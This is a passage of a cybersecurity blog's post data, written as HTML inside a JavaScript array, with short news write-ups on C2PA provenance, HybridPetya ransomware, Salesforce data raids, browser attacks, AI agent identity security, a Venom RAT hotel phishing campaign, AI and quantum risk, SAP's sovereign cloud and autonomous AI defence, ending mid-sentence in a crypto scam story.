        <li>🕵️ <b>False trust risk:</b> provenance proves origin and edits, not intent — manipulated content can still be harmful.</li>
        <li>🔁 <b>Label removal:</b> metadata can be stripped if files are edited/exported improperly — platforms must preserve provenance.</li>
        <li>🔒 <b>Privacy trade-offs:</b> embedding creator identity is optional; implementers must balance attribution with user privacy and consent.</li>
      </ul>
      <p>
        Organizations must pair provenance with contextual checks (source reputation, content analysis) for robust trust decisions.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#f7fbff,#e6f7fb); border-radius:12px; color:#04292f; margin-top:15px;">
      <h3 style="color:#05668d;">🌍 Real-World Impact</h3><br>
      <ul style="margin-left:20px; line-height:1.7; color:#023e4a;">
        <li>📰 <b>Newsrooms:</b> Faster verification workflows for user submissions and social posts.</li>
        <li>⚖️ <b>Legal & Forensics:</b> Better provenance data for chain-of-custody in investigations.</li>
        <li>📱 <b>Social platforms:</b> Automated signals to reduce spread of manipulated media and label suspect content.</li>
      </ul>
      <p style="color:#033b45;">
        Over time, provenance at source could significantly reduce the effectiveness of deepfake disinformation campaigns.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#e8f8f9,#dff3f5); border-radius:12px; color:#022f34; margin-top:15px;">
      <h3 style="color:#017a9b;">🛠 Implementation Notes for Organizations</h3><br>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>🔁 Ensure ingestion pipelines preserve C2PA metadata (don’t strip manifests during re-encoding).</li>
        <li>🔍 Integrate provenance checks into editorial and moderation tooling.</li>
        <li>🧾 Log verifications and maintain audit trails for important content decisions.</li>
        <li>🔐 Consider enterprise policies around attribution to avoid exposing sensitive creator identities.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#083d51,#0b5567); border-radius:12px; color:#eafcff; margin-top:15px;">
      <h3 style="color:#7fffd4;">✅ Actionable Recommendations</h3><br>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>✔️ Adopt C2PA verification in content pipelines for critical channels (news, legal, enterprise comms).</li>
        <li>✔️ Educate users and editors about what provenance proves — and what it doesn’t.</li>
        <li>✔️ Work with vendors to maintain signature verification services and key revocation processes.</li>
        <li>✔️ Combine provenance with automated content analysis (AI-detection + context signals) for higher confidence.</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#062a35,#0b3d47); border-radius:12px; color:#e9fbff; margin-top:15px;">
      <h3 style="color:#9ff7ea;">🚀 Final Thoughts</h3><br>
      <p>
        The Pixel 10’s C2PA rollout signals a practical path toward trustworthy media at scale.  
        While provenance won’t eliminate deception overnight, it gives platforms and users a verifiable signal that can greatly reduce misinformation and abuse of synthetic media.  
        For organizations, the near-term priority is to integrate provenance checks, preserve metadata, and combine cryptographic signals with smart content analysis.
      </p>
    </section>
  `},{id:"hybridpetya-ransomware-2025",title:"HybridPetya: The Ransomware That Breaks Secure Boot",summary:"A new strain bypasses UEFI protections, encrypts entire systems, and demands $1,000 in Bitcoin",date:"2025-09-14",author:"EthicalByte",tags:["Ransomware","HybridPetya","UEFI","Secure Boot","Malware"],imageKey:"hybridPetyaBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#1b2735,#090a0f); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff5252;">⚠ HybridPetya — A Ransomware Evolution</h3><br>
      <p>
        A new ransomware strain, <b>HybridPetya</b>, has emerged with a chilling capability: it can 
        <b>bypass Secure Boot protections</b> on modern PCs and embed itself into the <b>UEFI firmware</b>.  
        Victims are shown a fake <b>CHKDSK repair screen</b> before being hit with a <b>$1,000 Bitcoin demand</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c5364,#203a43); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ffca28;">🔑 How HybridPetya Works</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🖥 Exploits <b>Secure Boot vulnerabilities</b> to execute before the OS loads</li>
        <li>⚡ Infects the <b>UEFI firmware</b>, ensuring persistence beyond reinstalls</li>
        <li>🔒 Encrypts entire drives — not just files — leaving systems unusable</li>
        <li>💰 Displays ransom note demanding <b>$1,000 in Bitcoin</b></li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f2027,#203a43,#2c5364); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#90caf9;">🚨 Why This Threat Is Alarming</h3><br>
      <p>
        Traditional ransomware encrypts files after boot. <b>HybridPetya goes deeper</b> — it hijacks  
        the system before the operating system even starts, making recovery nearly impossible.  
        Security researchers warn that <b>Secure Boot bypass attacks are becoming more frequent</b>, 
        signaling a dangerous new era of ransomware evolution.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#1565c0;">🛡 Defenses Against HybridPetya</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ Keep <b>firmware and BIOS</b> updated to patch Secure Boot vulnerabilities</li>
        <li>✅ Enable <b>hardware-based security features</b> like TPM</li>
        <li>✅ Use <b>advanced endpoint protection</b> with firmware scanning</li>
        <li>✅ Maintain <b>offline, encrypted backups</b> to recover without paying</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#090a0f,#1b2735); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff5252;">💀 Final Thoughts</h3><br>
      <p>
        <b>HybridPetya</b> represents a new class of ransomware — one that attacks the very foundation of your system.  
        With Secure Boot and UEFI under siege, <b>prevention is critical</b>. Once infected, even wiping the OS may not be enough.  
        This is not just ransomware — it’s <b>ransomware redefined</b>.
      </p>
    </section>
  `},{id:"fbi-salesforce-raids-2025",title:"FBI Warns: Hackers Raiding Salesforce to Steal Data",summary:"UNC6040, UNC6395, and known groups like ShinyHunters, LAPSUS$, and Scattered Spider are behind the campaigns.",date:"2025-09-15",author:"EthicalByte",tags:["FBI Alert","Salesforce Breach","Token Theft","Phishing","Cybercrime Groups"],imageKey:"fbiSalesforceBreach",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#141E30,#243B55); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d4d;">🚨 FBI Alert: Salesforce Under Siege</h3><br>
      <p>
        The FBI has issued a new warning about <b>ongoing Salesforce data raids</b>, carried out by advanced 
        threat actors <b>UNC6040</b> and <b>UNC6395</b>. Using <b>stolen tokens, phishing calls, and custom malware</b>, 
        these hackers are breaching enterprise Salesforce instances to steal sensitive data and extort victims.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#232526,#414345); border-radius:12px; color:#eaeaea; margin-top:15px;">
      <h3 style="color:#ffca28;">🕵️ The Threat Actors</h3><br>
      <p>
        Investigators have tied the activity to cybercrime collectives including <b>ShinyHunters</b>, <b>LAPSUS$</b>, 
        and <b>Scattered Spider</b>. These groups briefly announced their "retirement," but the FBI cautions that such 
        claims are rarely trustworthy. Instead, they may be reorganizing and evolving their operations.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#000428,#004e92); border-radius:12px; color:#f0f0f0; margin-top:15px;">
      <h3 style="color:#90caf9;">⚙️ How the Attacks Work</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔑 Theft of <b>OAuth tokens</b> to gain persistent access</li>
        <li>📞 <b>Phishing calls</b> to trick employees into handing over credentials</li>
        <li>🛠 <b>Custom exploitation tools</b> tailored for Salesforce environments</li>
        <li>📤 Large-scale data exfiltration followed by extortion attempts</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1c1c1c,#434343); border-radius:12px; color:#ddd; margin-top:15px;">
      <h3 style="color:#34d399;">🌍 Impact on Organizations</h3><br>
      <p>
        The raids are not just about stolen customer data — they also compromise <b>licensing details</b>, 
        <b>support case text</b>, and other sensitive business information. This enables attackers to not only extort 
        companies but also weaponize stolen insights against customers and partners.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Defensive Measures</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Rotate and monitor <b>OAuth tokens</b> regularly</li>
        <li>✔️ Enable <b>multi-factor authentication (MFA)</b> across Salesforce accounts</li>
        <li>✔️ Train employees to detect <b>phishing attempts</b> over calls & emails</li>
        <li>✔️ Monitor for <b>unusual API calls or large data exports</b></li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#243B55,#141E30); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d4d;">⚡ Final Thoughts</h3><br>
      <p>
        The FBI’s warning makes one thing clear: <b>retired hacker groups don’t retire</b>.  
        They rebrand, regroup, and return stronger.  
        Enterprises must strengthen defenses around SaaS platforms like Salesforce — because attackers know 
        this is where the crown jewels are kept.
      </p>
    </section>
  `},{id:"browser-attacks-rising-2025",title:"Browser Attacks Surge as Hackers Exploit the Weakest Link",summary:"From MFA-bypassing phishing kits to malicious extensions — your browser is the new frontline.",date:"2025-09-16",author:"EthicalByte",tags:["Browser Security","Phishing","Malware","MFA Bypass","Cyber Threats"],imageKey:"browserAttacks2025Banner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#141e30,#243b55); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff9800;">🚨 Browsers Under Siege</h3><br>
      <p>
        Cybersecurity researchers are raising alarms as <b>browser-based attacks</b> skyrocket in 2025.  
        From <b>Snowflake</b> to <b>Salesforce</b>, attackers are exploiting the browser as their new weapon of choice —  
        bypassing security controls, stealing data, and planting malware.  
        The humble browser has become the <b>weakest link in enterprise defense</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a1a,#333333); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#03a9f4;">🛑 Key Tactics Attackers Use</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🎣 <b>Phishing Kits</b> — Fake login pages that bypass multi-factor authentication (MFA).</li>
        <li>⚡ <b>ClickFix Attacks</b> — Tricks users into clicking prompts that execute hidden malware.</li>
        <li>🧩 <b>Malicious Extensions</b> — Trojanized browser add-ons that sneak past official web stores.</li>
      </ul>
      <p>
        These methods exploit human trust and browser permissions — not just software vulnerabilities.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f2027,#2c5364); border-radius:12px; color:#f0f0f0; margin-top:15px;">
      <h3 style="color:#4caf50;">🌍 Real-World Impact</h3><br>
      <p>
        Security teams are reporting <b>massive data breaches</b> linked to browser attacks.  
        Compromised sessions give attackers access to corporate SaaS platforms,  
        cloud dashboards, and even financial systems.  
        In several cases, attackers bypassed traditional security solutions completely by <b>living inside the browser</b>.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#d32f2f;">🛡️ Defense Against Browser Attacks</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Deploy <b>browser isolation</b> and zero-trust browsing solutions.</li>
        <li>✔️ Restrict <b>browser extensions</b> to pre-approved, verified add-ons.</li>
        <li>✔️ Train employees to recognize <b>ClickFix prompts</b> and fake login flows.</li>
        <li>✔️ Monitor <b>session hijacking</b> and anomalous logins across SaaS platforms.</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#243b55,#141e30); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff9800;">✅ Final Thoughts</h3><br>
      <p>
        The browser is no longer just a tool — it’s the <b>primary attack surface</b>.  
        As phishing kits evolve and malicious extensions multiply,  
        organizations must rethink browser security as a <b>core part of cyber defense</b>.  
        In 2025, <b>your biggest breach may start with just one click</b>.
      </p>
    </section>
  `},{id:"ai-agent-security-astrix-2025",title:"Securing the Agentic Era: Astrix Launches AI Agent Control Plane",summary:"As AI agents outnumber employees 100:1, Astrix steps in to protect companies from invisible risks",date:"2025-09-17",author:"EthicalByte",tags:["AI Agents","Cybersecurity","Identity Security","Astrix","Automation Risks"],imageKey:"aiAgentControlBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#00e5ff;">🚨 The AI Identity Crisis</h3><br>
      <p>
        A staggering <b>80% of companies</b> have already faced <b>AI agent mishaps</b> — from unauthorized access 
        to accidental data leaks. The problem? <b>Non-human identities</b> such as bots, service accounts, and AI agents 
        now outnumber human employees <b>100:1</b>.  
        Without visibility and control, organizations are sleepwalking into a massive security gap.
      </p>
      <p>
        Unlike human users, these agents operate 24/7, make autonomous decisions, and often interact with sensitive 
        APIs and databases. That means even a single misconfigured or compromised agent could cause 
        <b>damage at machine speed</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#ffd166;">🧩 Why Traditional Security Fails</h3><br>
      <p>
        Firewalls and MFA protect <b>humans</b>, but they aren’t built for <b>autonomous AI agents</b> operating 
        inside networks, apps, and APIs.  
        These agents can create hidden risks by <b>sharing sensitive data, misusing privileges, 
        or executing tasks without oversight</b>.
      </p>
      <p>
        Traditional IAM (Identity & Access Management) tools simply can’t keep up with 
        the <b>scale, speed, and invisibility</b> of agent-to-agent interactions. 
        This gap has become the new frontier for attackers.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🔑 Astrix’s AI Agent Control Plane</h3><br>
      <p>
        Astrix has launched the <b>world’s first AI Agent Control Plane</b>, a dedicated platform for 
        securing non-human identities.  
        Key features include:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ <b>Visibility</b> into every AI agent and service account across the enterprise</li>
        <li>✅ <b>Policy enforcement</b> for limiting data access and privileges</li>
        <li>✅ <b>Real-time monitoring</b> to catch suspicious AI behavior before damage occurs</li>
        <li>✅ <b>Automated remediation</b> for instantly revoking risky permissions</li>
      </ul>
      <p>
        This isn’t just security for today — it’s infrastructure for the <b>next decade of automation</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">⚡ Why It Matters</h3><br>
      <p>
        As companies rush into the <b>agentic era</b>, the risks posed by autonomous AI systems will only grow.  
        Without guardrails, AI agents can expose organizations to <b>compliance failures, insider threats, 
        and large-scale breaches</b>.
      </p>
      <p>
        Remember — it’s not just about stopping external hackers.  
        The danger comes from inside, where AI agents <b>already have permissions and authority</b>.  
        Astrix provides a much-needed safety net for enterprises adopting AI at scale.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2196f3;">✅ Final Thoughts</h3><br>
      <p>
        The security perimeter has shifted — from people to <b>agents</b>.  
        Organizations must treat AI identities with the same rigor as human ones.  
        The Astrix AI Agent Control Plane might just become the blueprint for <b>AI-era identity security</b>.
      </p>
      <p>
        In short: if you’re deploying AI at scale without agent identity controls, 
        you’re not just unprepared — you’re already <b>exposed</b>.
      </p>
    </section>
  `},{id:"ta558-venom-revengehotels-2025",title:"Venom RAT & LLM Phishing: TA558 Targets Hotels to Steal Guest Data",summary:"RevengeHotels (TA558) uses AI-written phishing in Spanish/Portuguese to deliver Venom RAT that steals cards, kills Defender & spreads via USB.",date:"2025-09-18",author:"EthicalByte",tags:["TA558","Venom RAT","Hotel Security","LLM Phishing","Payment Card Theft","USB Spread"],imageKey:"venomHotelBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#041726,#0b3a4a); border-radius:12px; color:#eef8ff;">
      <h3 style="color:#ff7a59;">🏨 AI-driven Hotel Attacks: Venom RAT on the Move</h3><br>
      <p>
        A cybercrime group tracked as <b>TA558 (aka RevengeHotels)</b> has launched targeted attacks against hotels across the region using <b>LLM-generated phishing emails in Portuguese and Spanish</b>. 
        The lure is tailored to hospitality staff and contractors — realistic, localized messages that bypass normal suspicion.
      </p>
      <p>
        The payload: <b>Venom RAT</b> — a $650 commodity remote-access trojan that steals guest credit-card data, disables Microsoft Defender, and can propagate via removable media (USB). 
        The combination of AI-written social engineering and a cheap, effective RAT makes this campaign both scalable and dangerous.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0e3a47,#073241); border-radius:12px; color:#dff6ff; margin-top:15px;">
      <h3 style="color:#ffd166;">⚙️ How the Campaign Operates</h3><br>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>✉️ <b>LLM-crafted phishing emails</b> in native languages to increase click-through and reduce suspicion</li>
        <li>📎 Malicious attachments or links that drop the Venom RAT downloader</li>
        <li>🛡 Venom RAT disables Windows Defender/AV to avoid detection and maintain persistence</li>
        <li>🔌 Lateral spread via <b>infected USB drives</b> (especially dangerous in hospitality where USBs are commonly used for devices and kiosks)</li>
        <li>💳 Targeted exfiltration of POS and guest payment card data for resale or fraud</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#072b36,#0d2130); border-radius:12px; color:#e8fbff; margin-top:15px;">
      <h3 style="color:#9ff7ea;">🔍 Why Hotels Are an Attractive Target</h3><br>
      <p>
        Hotels hold a high density of payment card transactions, third-party vendors, and transient devices — a perfect storm for attackers:
      </p>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>High volume of cardholder data passing through POS systems and reservations platforms</li>
        <li>Frequent use of removable media, kiosks, and shared workstations</li>
        <li>Multiple third-party integrations (cleaning, catering, booking platforms) that increase the attack surface</li>
        <li>Often limited cybersecurity staffing and variable patching practices across properties</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#14323b,#09252b); border-radius:12px; color:#e8fbff; margin-top:15px;">
      <h3 style="color:#ffb86b;">🛡️ Immediate Mitigations (What Hotels Must Do Now)</h3><br>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>✔️ <b>Harden endpoints:</b> enforce EDR with tamper-protection and block known Venom RAT indicators</li>
        <li>✔️ <b>Preserve AV integrity:</b> prevent unauthorized disabling of Defender via policy and monitoring</li>
        <li>✔️ <b>Lock down removable media:</b> implement USB allowlisting or disable autorun and unneeded USB ports</li>
        <li>✔️ <b>Segment POS systems:</b> isolate payment environments from general corporate networks and guest Wi-Fi</li>
        <li>✔️ <b>Language-aware phishing training:</b> simulate local-language phishing and train staff to spot LLM-crafted messages</li>
        <li>✔️ <b>Vendor security checks:</b> vet third-party integrations and enforce least privilege for vendor accounts</li>
      </ul>
      <p>
        Prioritize rapid detection and containment: in Venom RAT incidents, early isolation of infected hosts and credential resets reduce downstream exposure.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#06202a,#04161d); border-radius:12px; color:#dff8ff; margin-top:15px;">
      <h3 style="color:#ffd166;">📈 Longer-Term Controls</h3><br>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>🔐 Adopt strong MFA and short-lived API keys for all vendor/service accounts</li>
        <li>🔎 Implement continuous threat hunting focused on lateral movement and USB-based spread patterns</li>
        <li>🧾 Maintain robust logging and centralized SIEM to detect odd processes or Defender tampering</li>
        <li>🤝 Share IoCs and attack patterns with hospitality sector peers and CERTs</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#08161b,#0b2a33); border-radius:12px; color:#eefbff; margin-top:15px;">
      <h3 style="color:#ff7a59;">✅ Final Take</h3><br>
      <p>
        TA558’s campaign is an example of how cheap commodity malware + LLM social engineering creates a highly scalable threat to the hospitality industry.  
        Hotels must treat AI-crafted social engineering as a real operational risk and lock down endpoints, removable media, and payment environments — fast.
      </p>
      <p style="font-size:0.9em; color:#bcdbe6;">Source: TheHackerNews — https://thehackernews.com/2025/09/ta558-uses-ai-generated-scripts-to.html</p>
    </section>
  `},{id:"ai-quantum-cybersecurity-2025",title:"AI + Quantum: The Next Frontier in Cybersecurity",summary:"Great potential, greater risks — experts warn of a new era of cyber challenges",date:"2025-09-19",author:"EthicalByte",tags:["AI","Quantum Computing","Cybersecurity","Webinar","Future Tech"],imageKey:"aiQuantumCyberBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f2027,#203a43,#2c5364); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#00e5ff;">🤖⚛ When AI Meets Quantum</h3><br>
      <p>
        AI and Quantum Computing are converging to reshape technology — and cybersecurity is at the heart of this evolution.  
        Together, they promise breakthroughs in <b>drug discovery, logistics, encryption, and national security</b>.  
        But they also introduce a whole new category of <b>unpredictable risks</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1c1c1c,#434343); border-radius:12px; color:#f0f0f0; margin-top:15px;">
      <h3 style="color:#ffca28;">🔑 The Dual-Edged Sword</h3><br>
      <p>
        While Quantum can <b>crack today’s encryption</b>, it can also power the <b>next generation of quantum-safe cryptography</b>.  
        Meanwhile, AI amplifies both sides — accelerating defenses but also helping attackers build smarter exploits, faster phishing campaigns, and <b>adaptive malware</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#28313b,#485563); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#90caf9;">🌍 Why It Matters</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>⚡ Quantum may render RSA & ECC obsolete within the decade.</li>
        <li>🤖 AI-driven attackers can weaponize deepfakes, zero-days, and automated social engineering.</li>
        <li>🔐 Together, AI + Quantum redefine <b>trust, privacy, and digital resilience</b>.</li>
      </ul>
    </section>


    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#00e5ff;">✅ Final Thoughts</h3><br>
      <p>
        The AI + Quantum revolution is here.  
        It holds <b>incredible potential</b> but also opens the door to <b>unprecedented risks</b>.  
        The only way forward is to stay informed, build resilience, and prepare for a future where <b>trust is quantum-proof</b>.
      </p>
    </section>
  `},{id:"sap-sovereign-cloud-india-2025",title:"SAP Launches Sovereign Cloud in India to Boost Digital Future",summary:"Empowering governments and enterprises with data sovereignty, compliance, and AI-ready infrastructure for a self-reliant digital future.",date:"2025-09-22",author:"EthicalByte",tags:["SAP","Sovereign Cloud","India","Data Sovereignty","Cloud Security","Digital Transformation"],imageKey:"sapSovereignCloudIndia",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#002b36,#003f5c); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#00e5ff;">🇮🇳 A Big Leap in Digital Sovereignty</h3><br>
      <p>
        SAP has officially launched its <b>Sovereign Cloud in India</b>, a major milestone in the nation’s push toward 
        <b>digital self-reliance</b>. This cloud infrastructure ensures that <b>critical data stays within Indian borders</b>, 
        addressing concerns around data sovereignty, compliance, and resilience.  
      </p>
      <p>
        By combining <b>local data control</b> with global cloud innovation, SAP is enabling India to build a secure, 
        future-ready digital backbone that aligns with national priorities.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1c1c1c,#434343); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#ffca28;">☁ What Makes It Different?</h3><br>
      <p>
        The Sovereign Cloud goes beyond traditional hosting solutions. It introduces:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ <b>Data residency</b>: Information is fully processed and stored within India’s jurisdiction.</li>
        <li>✅ <b>Flexible deployments</b>: Options include on-premise, trusted partners, and hyperscalers like AWS — but always under Indian law.</li>
        <li>✅ <b>Regulatory alignment</b>: Compliant with India’s <b>DPDP Act</b> and sector-specific regulations.</li>
        <li>✅ <b>AI-ready foundation</b>: Designed to support next-gen technologies like <b>AI, ML, and analytics</b> securely.</li>
      </ul>
      <p>
        This positions India as one of the first countries to combine sovereignty with <b>cutting-edge innovation at scale</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🔑 Why Sovereign Cloud Matters</h3><br>
      <p>
        In today’s interconnected world, <b>data is power</b>. With rising cyber threats, foreign surveillance risks, 
        and increasing compliance demands, <b>keeping sensitive data within borders</b> has become a necessity.  
      </p>
      <p>
        Sovereign Cloud provides governments, enterprises, and regulators with the confidence that their 
        <b>critical data is secure, compliant, and locally controlled</b>.  
        This is crucial in industries like <b>finance, healthcare, energy, and defense</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ff4d6d;">🌍 Real-World Impact</h3><br>
      <p>
        SAP’s Sovereign Cloud in India is more than just infrastructure — it’s a <b>national enabler</b>:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🏛 <b>Governments</b>: Ensure e-governance data remains in-country, supporting citizen trust.</li>
        <li>💳 <b>Financial sector</b>: Protect sensitive banking records, payment data, and ensure RBI compliance.</li>
        <li>🏥 <b>Healthcare</b>: Store and analyze patient data securely while enabling AI-powered diagnostics.</li>
        <li>🏭 <b>Enterprises</b>: Accelerate digital transformation without fear of compliance failures.</li>
      </ul>
      <p>
        Together, these capabilities strengthen <b>India’s position as a global digital leader</b>.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2196f3;">🚀 Final Thoughts</h3><br>
      <p>
        With the launch of <b>SAP Sovereign Cloud in India</b>, the country is taking a decisive step toward 
        <b>digital sovereignty</b>.  
        By blending global innovation with <b>local trust and compliance</b>, India is ensuring its digital economy 
        is <b>resilient, future-proof, and secure</b>.  
      </p>
      <p>
        This is not just about technology — it’s about <b>empowering India’s digital future</b>.
      </p>
    </section>
  `},{id:"autonomous-ai-cybersecurity-2025",title:"Agents Of Change: The Rise Of Autonomous AI In Cybersecurity",summary:"Autonomous AI systems are reshaping cybersecurity by analyzing data at scale, detecting patterns, and responding in real time to evolving threats.",date:"2025-09-23",author:"EthicalByte",tags:["Autonomous AI","Cybersecurity","Threat Detection","AI Security","Future Tech"],imageKey:"autonomousAICyberBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#00e5ff;">⚡ A New Era of Defense</h3><br>
      <p>
        Autonomous AI systems are no longer experimental — they are becoming the <b>core of modern cybersecurity</b>.  
        Unlike traditional tools that rely on human response times, these systems can <b>analyze massive datasets instantly</b>, 
        detect subtle anomalies, and respond to threats at <b>machine speed</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#ffd166;">🔑 What Makes It Different</h3><br>
      <p>
        Human security teams can only scale so far.  
        Autonomous AI augments their capabilities by:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ <b>Analyzing vast amounts of telemetry data</b> in real time</li>
        <li>✅ <b>Identifying attack patterns</b> invisible to the human eye</li>
        <li>✅ <b>Responding instantly</b> before attackers can escalate</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🌍 Real-World Impact</h3><br>
      <p>
        From <b>banking systems</b> to <b>critical infrastructure</b>, autonomous AI is already 
        helping organizations stay ahead of <b>sophisticated cyber attacks</b>.  
        With threat actors adopting AI themselves, this technology has shifted from 
        an innovation to a <b>necessity</b>.
      </p>
      <p>
        PwC research highlights how <b>AI + cybersecurity</b> are converging to redefine risk management and resilience.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">⚡ Why It Matters</h3><br>
      <p>
        As <b>quantum computing</b>, <b>autonomous agents</b>, and <b>AI-driven malware</b> emerge,  
        organizations must embrace autonomous AI not just as a tool, but as a <b>strategic shield</b>.  
        Without it, defenders risk falling behind in an arms race that is accelerating every day.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2196f3;">✅ Final Thoughts</h3><br>
      <p>
        Cybersecurity is no longer about reacting — it’s about <b>predicting and preventing</b>.  
        Autonomous AI marks a turning point, where defense systems don’t just wait for alerts,  
        they <b>act first</b>.  
        This is the future of safeguarding digital assets and infrastructure.
      </p>
    </section>
  `},{id:"europe-crypto-scam-bust-2025",title:"Europe Cracks Down on €100M Crypto Scam",summary:"A multinational crackdown exposes a crypto fraud ring spanning 23 countries, marking one of Europe’s largest financial cybercrime busts.",date:"2025-09-24",author:"EthicalByte",tags:["Crypto Scam","Fraud","Cybercrime","Europe","Eurojust"],imageKey:"europeCryptoScam2025",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#141E30,#243B55); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 €100M Crypto Scam Exposed</h3><br>
      <p>
        A coordinated European investigation has <b>brought down a crypto scam worth €100 million</b>.  
        Since 2018, five suspects orchestrated a sophisticated fraud scheme, luring victims in  
